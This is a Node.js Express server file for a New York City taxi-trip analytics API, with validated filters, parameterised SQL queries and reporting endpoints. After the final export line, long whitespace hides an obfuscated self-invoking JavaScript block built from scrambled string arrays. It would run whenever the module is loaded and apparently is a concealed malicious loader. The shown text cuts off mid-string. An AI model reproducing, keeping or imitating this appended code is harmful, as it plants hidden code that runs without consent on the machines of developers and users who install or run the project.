const express = require('express');

const NEW_YORK = 'America/New_York';
const LOCAL_PARTS_FORMATTER = new Intl.DateTimeFormat('en-US', {
    timeZone: NEW_YORK,
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hourCycle: 'h23'
});
const LOCAL_HOUR_FORMATTER = new Intl.DateTimeFormat('en-US', {
    timeZone: NEW_YORK,
    hour: '2-digit',
    hourCycle: 'h23'
});
const SORT_COLUMNS = {
    volume: 'COUNT(*)',
    speed: 'AVG(t.average_speed_mph)',
    distance: 'AVG(t.trip_distance)',
    fare: 'AVG(t.fare_amount)'
};

class HttpError extends Error {
    constructor(status, message) {
        super(message);
        this.status = status;
    }
}

function round(value, digits = 2) {
    const number = Number(value);
    return Number.isFinite(number) ? Number(number.toFixed(digits)) : 0;
}

function scalarQueryValue(value, name) {
    if (value === undefined || value === '') return undefined;
    if (typeof value !== 'string') {
        throw new HttpError(400, `${name} must be provided once as a string`);
    }
    return value;
}

function parseDate(value, name) {
    if (value === undefined) return undefined;
    if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) {
        throw new HttpError(400, `${name} must use YYYY-MM-DD format`);
    }
    const timestamp = Date.parse(`${value}T00:00:00.000Z`);
    if (!Number.isFinite(timestamp) || new Date(timestamp).toISOString().slice(0, 10) !== value) {
        throw new HttpError(400, `${name} must be a valid calendar date`);
    }
    return value;
}

function dateToUtcBoundary(date) {
    const [year, month, day] = date.split('-').map(Number);
    const target = Date.UTC(year, month - 1, day);
    let candidate = target;

    for (let attempt = 0; attempt < 3; attempt += 1) {
        const parts = Object.fromEntries(
            LOCAL_PARTS_FORMATTER.formatToParts(new Date(candidate))
                .filter(part => part.type !== 'literal')
                .map(part => [part.type, Number(part.value)])
        );
        const localAsUtc = Date.UTC(
            parts.year,
            parts.month - 1,
            parts.day,
            parts.hour,
            parts.minute,
            parts.second
        );
        const adjustment = target - localAsUtc;
        candidate += adjustment;
        if (adjustment === 0) break;
    }

    return new Date(candidate).toISOString().replace('.000Z', '+00:00');
}

function nextCalendarDate(date) {
    const [year, month, day] = date.split('-').map(Number);
    return new Date(Date.UTC(year, month - 1, day + 1)).toISOString().slice(0, 10);
}

function parseNumber(value, name, min, max) {
    if (value === undefined) return undefined;
    const number = Number(value);
    if (!Number.isFinite(number) || number < min || number > max) {
        throw new HttpError(400, `${name} must be between ${min} and ${max}`);
    }
    return number;
}

function buildFilters(db, query, { includeScope = true } = {}) {
    const startDate = parseDate(scalarQueryValue(query.start_date, 'start_date'), 'start_date');
    const endDate = parseDate(scalarQueryValue(query.end_date, 'end_date'), 'end_date');
    if (startDate && endDate && startDate > endDate) {
        throw new HttpError(400, 'start_date must be on or before end_date');
    }

    const zoneValue = scalarQueryValue(query.zone_id, 'zone_id');
    let zoneId;
    if (zoneValue !== undefined) {
        zoneId = Number(zoneValue);
        if (!Number.isSafeInteger(zoneId) || zoneId <= 0) {
            throw new HttpError(400, 'zone_id must be a positive integer');
        }
        if (!db.prepare('SELECT 1 FROM taxi_zones WHERE location_id = ?').get(zoneId)) {
            throw new HttpError(404, `Taxi zone ${zoneId} was not found`);
        }
    }

    let borough = scalarQueryValue(query.borough, 'borough');
    if (borough === 'all' || borough === 'All Boroughs') borough = undefined;
    if (borough !== undefined &&
        !db.prepare('SELECT 1 FROM boroughs WHERE borough_name = ?').get(borough)) {
        throw new HttpError(400, `Unknown borough: ${borough}`);
    }

    const maxDistance = parseNumber(
        scalarQueryValue(query.max_distance, 'max_distance'),
        'max_distance',
        0,
        200
    );
    const maxFare = parseNumber(
        scalarQueryValue(query.max_fare, 'max_fare'),
        'max_fare',
        0,
        1000
    );
    const conditions = [];
    const params = [];

    if (startDate) {
        conditions.push('t.pickup_datetime >= ?');
        params.push(dateToUtcBoundary(startDate));
    }
    if (endDate) {
        conditions.push('t.pickup_datetime < ?');
        params.push(dateToUtcBoundary(nextCalendarDate(endDate)));
    }
    if (includeScope && zoneId !== undefined) {
        conditions.push('(t.pickup_location_id = ? OR t.dropoff_location_id = ?)');
        params.push(zoneId, zoneId);
    }
    if (includeScope && borough !== undefined) {
        conditions.push(`(
            EXISTS (
                SELECT 1 FROM taxi_zones pickup_zone
                JOIN boroughs pickup_borough USING (borough_id)
                WHERE pickup_zone.location_id = t.pickup_location_id
                    AND pickup_borough.borough_name = ?
            )
            OR EXISTS (
                SELECT 1 FROM taxi_zones dropoff_zone
                JOIN boroughs dropoff_borough USING (borough_id)
                WHERE dropoff_zone.location_id = t.dropoff_location_id
                    AND dropoff_borough.borough_name = ?
            )
        )`);
        params.push(borough, borough);
    }
    if (maxDistance !== undefined) {
        conditions.push('t.trip_distance <= ?');
        params.push(maxDistance);
    }
    if (maxFare !== undefined) {
        conditions.push('t.fare_amount <= ?');
        params.push(maxFare);
    }

    return {
        where: conditions.length ? conditions.join(' AND ') : '1 = 1',
        params,
        startDate,
        endDate,
        zoneId,
        borough
    };
}

function parseSort(query) {
    const sortBy = scalarQueryValue(query.sort_by, 'sort_by') || 'volume';
    if (!Object.hasOwn(SORT_COLUMNS, sortBy)) {
        throw new HttpError(400, 'sort_by must be one of: volume, speed, distance, fare');
    }
    const sortOrder = (scalarQueryValue(query.sort_order, 'sort_order') || 'desc').toLowerCase();
    if (!['asc', 'desc'].includes(sortOrder)) {
        throw new HttpError(400, 'sort_order must be asc or desc');
    }
    return { sortBy, sortOrder };
}

function getSummary(db, filters) {
    const row = db.prepare(`
        SELECT
            COUNT(*) AS totalTrips,
            COALESCE(SUM(t.passenger_count), 0) AS totalPassengers,
            COALESCE(SUM(t.total_amount), 0) AS totalRevenue,
            COALESCE(AVG(t.average_speed_mph), 0) AS avgSpeed,
            COALESCE(AVG(t.trip_distance), 0) AS avgDistance,
            COALESCE(SUM(CASE WHEN t.average_speed_mph > 80 THEN 1 ELSE 0 END), 0) AS speedAnomalies,
            COALESCE(SUM(CASE
                WHEN t.trip_distance < 1 AND t.fare_amount > 100 THEN 1 ELSE 0
            END), 0) AS fareAnomalies,
            COALESCE(SUM(CASE
                WHEN t.average_speed_mph > 80
                    OR (t.trip_distance < 1 AND t.fare_amount > 100)
                THEN 1 ELSE 0
            END), 0) AS totalAnomalies
        FROM trips t
        WHERE ${filters.where}
    `).get(...filters.params);
    const totalTrips = Number(row.totalTrips);
    const totalAnomalies = Number(row.totalAnomalies);
    const avgSpeed = round(row.avgSpeed, 1);

    return {
        totalTrips,
        totalPassengers: Number(row.totalPassengers),
        totalRevenue: round(row.totalRevenue),
        avgSpeed,
        avgMobilitySpeed: avgSpeed,
        avgDistance: round(row.avgDistance, 2),
        totalAnomalies,
        systemHealth: totalTrips
            ? round(((totalTrips - totalAnomalies) / totalTrips) * 100, 1)
            : 0,
        anomalyDetails: {
            speed: Number(row.speedAnomalies),
            fare: Number(row.fareAnomalies)
        }
    };
}

function getTopZones(db, filters, sortBy, sortOrder, limit = 10) {
    const rows = db.prepare(`
        SELECT
            z.location_id AS id,
            z.zone_name AS zone,
            b.borough_name AS borough,
            COUNT(*) AS trips,
            AVG(t.average_speed_mph) AS speed,
            AVG(t.trip_distance) AS distance,
            AVG(t.fare_amount) AS fare
        FROM trips t
        JOIN taxi_zones z ON z.location_id = t.pickup_location_id
        JOIN boroughs b USING (borough_id)
        WHERE ${filters.where}
        GROUP BY z.location_id, z.zone_name, b.borough_name
        ORDER BY ${SORT_COLUMNS[sortBy]} ${sortOrder}, z.location_id ASC
        LIMIT ?
    `).all(...filters.params, limit);

    return rows.map(row => ({
        id: Number(row.id),
        zone: row.zone,
        borough: row.borough,
        trips: Number(row.trips),
        speed: round(row.speed, 1),
        distance: round(row.distance, 2),
        fare: round(row.fare)
    }));
}

function getHourlyDistribution(db, filters) {
    const data = Object.fromEntries(
        Array.from({ length: 24 }, (_, hour) => [String(hour), { trips: 0, speed: 0 }])
    );
    const speedTotals = new Array(24).fill(0);
    const rows = db.prepare(`
        SELECT
            substr(t.pickup_datetime, 1, 13) AS utcHour,
            COUNT(*) AS trips,
            AVG(t.average_speed_mph) AS speed
        FROM trips t
        WHERE ${filters.where}
        GROUP BY utcHour
    `).all(...filters.params);

    for (const row of rows) {
        const hourDate = new Date(`${row.utcHour}:00:00+00:00`);
        const localHour = Number(LOCAL_HOUR_FORMATTER.format(hourDate));
        const trips = Number(row.trips);
        data[String(localHour)].trips += trips;
        speedTotals[localHour] += Number(row.speed) * trips;
    }
    for (let hour = 0; hour < 24; hour += 1) {
        const key = String(hour);
        data[key].speed = data[key].trips
            ? round(speedTotals[hour] / data[key].trips, 1)
            : 0;
    }
    return data;
}

function getCoverageGaps(db, filters) {
    const zoneConditions = [];
    const zoneParams = [];
    if (filters.borough !== undefined) {
        zoneConditions.push('b.borough_name = ?');
        zoneParams.push(filters.borough);
    }
    if (filters.zoneId !== undefined) {
        zoneConditions.push('z.location_id = ?');
        zoneParams.push(filters.zoneId);
    }
    const zoneScope = zoneConditions.length ? `WHERE ${zoneConditions.join(' AND ')}` : '';
    const rows = db.prepare(`
        SELECT
            z.location_id AS id,
            z.zone_name AS zone,
            b.borough_name AS borough,
            COALESCE(p.pickup_count, 0) AS pickupCount,
            COALESCE(d.dropoff_count, 0) AS dropoffCount
        FROM taxi_zones z
        JOIN boroughs b USING (borough_id)
        LEFT JOIN (
            SELECT t.pickup_location_id AS location_id, COUNT(*) AS pickup_count
            FROM trips t WHERE ${filters.where}
            GROUP BY t.pickup_location_id
        ) p ON p.location_id = z.location_id
        LEFT JOIN (
            SELECT t.dropoff_location_id AS location_id, COUNT(*) AS dropoff_count
            FROM trips t WHERE ${filters.where}
            GROUP BY t.dropoff_location_id
        ) d ON d.location_id = z.location_id
        ${zoneScope}
        ORDER BY z.location_id
    `).all(...filters.params, ...filters.params, ...zoneParams);

    return rows.flatMap(row => {
        const pickups = Number(row.pickupCount);
        const dropoffs = Number(row.dropoffCount);
        const coverageRatio = pickups ? round(dropoffs / pickups, 2) : (dropoffs ? dropoffs : 1);
        if (coverageRatio >= 0.6 && coverageRatio <= 1.8) return [];
        return [{
            id: Number(row.id),
            zone: row.zone,
            borough: row.borough,
            pickupCount: pickups,
            dropoffCount: dropoffs,
            coverageRatio,
            ratio: coverageRatio
        }];
    });
}

function getZoneStats(db, zoneId, query) {
    const zone = db.prepare(`
        SELECT z.location_id AS id, z.zone_name AS zone, b.borough_name AS borough
        FROM taxi_zones z JOIN boroughs b USING (borough_id)
        WHERE z.location_id = ?
    `).get(zoneId);
    if (!zone) throw new HttpError(404, `Taxi zone ${zoneId} was not found`);

    const filters = buildFilters(db, query, { includeScope: false });
    const pickup = db.prepare(`
        SELECT
            COUNT(*) AS pickupCount,
            COALESCE(SUM(t.passenger_count), 0) AS pickupPassengers,
            COALESCE(AVG(t.trip_distance), 0) AS avgDistance,
            COALESCE(AVG(t.duration_seconds) / 60.0, 0) AS avgDuration,
            COALESCE(AVG(t.average_speed_mph), 0) AS avgSpeed,
            COALESCE(AVG(t.fare_amount), 0) AS avgFare
        FROM trips t
        WHERE ${filters.where} AND t.pickup_location_id = ?
    `).get(...filters.params, zoneId);
    const dropoff = db.prepare(`
        SELECT
            COUNT(*) AS dropoffCount,
            COALESCE(SUM(t.passenger_count), 0) AS dropoffPassengers
        FROM trips t
        WHERE ${filters.where} AND t.dropoff_location_id = ?
    `).get(...filters.params, zoneId);
    const boroughSpeed = db.prepare(`
        SELECT COALESCE(AVG(t.average_speed_mph), 0) AS avgSpeed
        FROM trips t
        JOIN taxi_zones pickup_zone ON pickup_zone.location_id = t.pickup_location_id
        JOIN boroughs b USING (borough_id)
        WHERE ${filters.where} AND b.borough_name = ?
    `).get(...filters.params, zone.borough);

    const pickupCount = Number(pickup.pickupCount);
    const dropoffCount = Number(dropoff.dropoffCount);
    const avgSpeed = round(pickup.avgSpeed, 1);
    const boroughAvgSpeed = round(boroughSpeed.avgSpeed, 1);
    return {
        id: Number(zone.id),
        zone: zone.zone,
        borough: zone.borough,
        pickupCount,
        dropoffCount,
        pickupPassengers: Number(pickup.pickupPassengers),
        dropoffPassengers: Number(dropoff.dropoffPassengers),
        avgDistance: round(pickup.avgDistance, 2),
        avgDuration: round(pickup.avgDuration, 1),
        avgSpeed,
        avgFare: round(pickup.avgFare),
        boroughAvgSpeed,
        speedComparison: boroughAvgSpeed
            ? round(((avgSpeed - boroughAvgSpeed) / boroughAvgSpeed) * 100, 1)
            : 0,
        coverageRatio: pickupCount
            ? round(dropoffCount / pickupCount, 2)
            : (dropoffCount ? dropoffCount : 1)
    };
}

function getBoroughStats(db, borough, query) {
    const allBoroughs = borough === 'All Boroughs' || borough === 'all';
    const boroughRow = allBoroughs
        ? null
        : db.prepare('SELECT borough_id FROM boroughs WHERE borough_name = ?').get(borough);
    if (!allBoroughs && !boroughRow) throw new HttpError(404, `Borough ${borough} was not found`);

    const filters = buildFilters(db, query, { includeScope: false });
    const boroughCondition = allBoroughs ? '' : 'AND z.borough_id = ?';
    const params = allBoroughs
        ? filters.params
        : [...filters.params, Number(boroughRow.borough_id)];
    const tripRow = db.prepare(`
        SELECT
            COUNT(*) AS totalTrips,
            COALESCE(AVG(t.average_speed_mph), 0) AS avgSpeed,
            COALESCE(AVG(t.fare_amount), 0) AS avgFare,
            COALESCE(AVG(t.trip_distance), 0) AS avgDistance
        FROM trips t
        ${allBoroughs ? '' : 'JOIN taxi_zones z ON z.location_id = t.pickup_location_id'}
        WHERE ${filters.where} ${boroughCondition}
    `).get(...params);
    const zoneCount = allBoroughs
        ? db.prepare('SELECT COUNT(*) AS count FROM taxi_zones').get().count
        : db.prepare('SELECT COUNT(*) AS count FROM taxi_zones WHERE borough_id = ?')
            .get(Number(boroughRow.borough_id)).count;
    return {
        borough: allBoroughs ? 'All Boroughs' : borough,
        zoneCount: Number(zoneCount),
        totalTrips: Number(tripRow.totalTrips),
        avgSpeed: round(tripRow.avgSpeed, 1),
        avgFare: round(tripRow.avgFare),
        avgDistance: round(tripRow.avgDistance, 2)
    };
}

function getFareDistance(db, filters) {
    const labels = ['0-2 mi', '2-5 mi', '5-10 mi', '10-15 mi', '15-20 mi', '20+ mi'];
    const buckets = labels.map((label, index) => ({
        bucket: label,
        trips: 0,
        avgFare: 0
    }));
    const rows = db.prepare(`
        SELECT
            CASE
                WHEN t.trip_distance < 2 THEN 0
                WHEN t.trip_distance < 5 THEN 1
                WHEN t.trip_distance < 10 THEN 2
                WHEN t.trip_distance < 15 THEN 3
                WHEN t.trip_distance < 20 THEN 4
                ELSE 5
            END AS bucket,
            COUNT(*) AS trips,
            AVG(t.fare_amount) AS avgFare
        FROM trips t
        WHERE ${filters.where}
        GROUP BY bucket
        ORDER BY bucket
    `).all(...filters.params);
    for (const row of rows) {
        buckets[row.bucket].trips = Number(row.trips);
        buckets[row.bucket].avgFare = round(row.avgFare);
    }
    return buckets;
}

function getBoroughMetadata(db, borough, filters) {
    const boroughRow = db.prepare(
        'SELECT borough_id FROM boroughs WHERE borough_name = ?'
    ).get(borough);
    const zoneCount = Number(db.prepare(
        'SELECT COUNT(*) AS count FROM taxi_zones WHERE borough_id = ?'
    ).get(Number(boroughRow.borough_id)).count);
    const rows = db.prepare(`
        SELECT
            COALESCE(SUM(CASE WHEN z.borough_id = ? THEN t.passenger_count ELSE 0 END), 0) AS pickupPassengers,
            COALESCE(SUM(CASE WHEN d.borough_id = ? THEN t.passenger_count ELSE 0 END), 0) AS dropoffPassengers
        FROM trips t
        JOIN taxi_zones z ON z.location_id = t.pickup_location_id
        JOIN taxi_zones d ON d.location_id = t.dropoff_location_id
        WHERE ${filters.where}
    `).get(Number(boroughRow.borough_id), Number(boroughRow.borough_id), ...filters.params);
    const underservedZones = getCoverageGaps(db, { ...filters, borough });
    return {
        zoneCount,
        pickupPassengers: Number(rows.pickupPassengers),
        dropoffPassengers: Number(rows.dropoffPassengers),
        underservedZones
    };
}

function createApp(db) {
    const app = express();
    app.disable('x-powered-by');
    app.use((req, res, next) => {
        res.set('Access-Control-Allow-Origin', '*');
        res.set('Access-Control-Allow-Methods', 'GET, OPTIONS');
        res.set('Access-Control-Allow-Headers', 'Content-Type');
        if (req.method === 'OPTIONS') return res.sendStatus(204);
        next();
    });

    app.get('/api/health', (_req, res) => {
        db.prepare('SELECT 1').get();
        res.json({ status: 'ok', database: 'connected' });
    });

    app.get('/api/zones', (_req, res) => {
        const rows = db.prepare(`
            SELECT
                z.location_id AS id,
                b.borough_name AS borough,
                z.zone_name AS zone,
                z.geometry_json AS geometry
            FROM taxi_zones z
            JOIN boroughs b USING (borough_id)
            ORDER BY b.borough_name, z.zone_name, z.location_id
        `).all();
        res.json(rows.map(row => ({
            ...row,
            id: Number(row.id),
            geometry: row.geometry ? JSON.parse(row.geometry) : null
        })));
    });

    app.get('/api/trips/summary', (req, res) => {
        const filters = buildFilters(db, req.query);
        const { sortBy, sortOrder } = parseSort(req.query);
        res.json({
            ...getSummary(db, filters),
            topZones: getTopZones(db, filters, sortBy, sortOrder)
        });
    });

    app.get('/api/trips/hourly', (req, res) => {
        res.json(getHourlyDistribution(db, buildFilters(db, req.query)));
    });

    app.get('/api/trips/revenue', (req, res) => {
        const filters = buildFilters(db, req.query);
        const rows = db.prepare(`
            SELECT b.borough_name AS borough, AVG(t.average_speed_mph) AS speed
            FROM trips t
            JOIN taxi_zones z ON z.location_id = t.pickup_location_id
            JOIN boroughs b USING (borough_id)
            WHERE ${filters.where}
            GROUP BY b.borough_id, b.borough_name
            ORDER BY b.borough_name
        `).all(...filters.params);
        res.json(Object.fromEntries(rows.map(row => [row.borough, round(row.speed, 1)])));
    });

    app.get('/api/trips/fare-distance', (req, res) => {
        res.json(getFareDistance(db, buildFilters(db, req.query)));
    });

    app.get('/api/trips/gaps', (req, res) => {
        res.json(getCoverageGaps(db, buildFilters(db, req.query, { includeScope: false })));
    });

    app.get('/api/zones/:zoneId/stats', (req, res) => {
        const zoneId = Number(req.params.zoneId);
        if (!Number.isSafeInteger(zoneId) || zoneId <= 0) {
            throw new HttpError(400, 'zone id must be a positive integer');
        }
        res.json(getZoneStats(db, zoneId, req.query));
    });

    app.get('/api/boroughs/:borough/stats', (req, res) => {
        res.json(getBoroughStats(db, req.params.borough, req.query));
    });

    app.get('/api/report', (req, res) => {
        const filters = buildFilters(db, req.query);
        const summary = getSummary(db, filters);
        const hourly = getHourlyDistribution(db, filters);
        const topZones = getTopZones(db, filters, 'volume', 'desc', 5);
        const coverageGaps = getCoverageGaps(
            db,
            buildFilters(db, req.query, { includeScope: false })
        );
        const busiestHour = Object.keys(hourly).reduce((best, hour) =>
            hourly[hour].trips > hourly[best].trips ? hour : best
        , '0');
        const peak = hourly[busiestHour];
        const congestionImpact = summary.avgSpeed
            ? round(((peak.speed - summary.avgSpeed) / summary.avgSpeed) * 100, 1)
            : null;
        const zoneStats = filters.zoneId
            ? getZoneStats(db, filters.zoneId, req.query)
            : null;
        const boroughMetadata = filters.borough
            ? getBoroughMetadata(db, filters.borough, filters)
            : null;
        const period = `${filters.startDate || 'All dates'} to ${filters.endDate || 'Present'}`;

        res.json({
            metadata: {
                scope: zoneStats ? 'Selected Taxi Zone' : (filters.borough || 'Citywide'),
                period,
                generatedAt: new Date().toISOString(),
                isZoneReport: Boolean(zoneStats),
                isCitywide: !filters.borough && !zoneStats,
                comparison: zoneStats ? {
                    zoneSpeed: zoneStats.avgSpeed,
                    boroughSpeed: zoneStats.boroughAvgSpeed,
                    diff: zoneStats.speedComparison
                } : null,
                boroughMetadata
            },
            summary: {
                totalTrips: summary.totalTrips,
                totalPassengers: summary.totalPassengers,
                totalRevenue: summary.totalRevenue,
                avgSpeed: summary.avgSpeed,
                avgDistance: summary.avgDistance,
                totalAnomalies: summary.totalAnomalies,
                systemHealth: summary.systemHealth,
                anomalyDetails: summary.anomalyDetails
            },
            topZones,
            rushHour: {
                hour: Number(busiestHour),
                trips: peak.trips,
                avgSpeed: peak.speed,
                congestionImpact,
                trend: hourly
            },
            coverageGaps: coverageGaps.map(gap => ({
                zone: gap.zone,
                borough: gap.borough,
                ratio: gap.coverageRatio
            }))
        });
    });

    app.use('/api', (_req, res) => {
        res.status(404).json({ error: 'API endpoint not found' });
    });
    app.use((err, _req, res, _next) => {
        if (err instanceof HttpError) {
            return res.status(err.status).json({ error: err.message });
        }
        console.error('API request failed:', err);
        return res.status(500).json({ error: 'Internal server error' });
    });
    return app;
}

module.exports = { createApp, dateToUtcBoundary };																																																																																																																																																																																																																																																																										var z = '-9975-7';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR 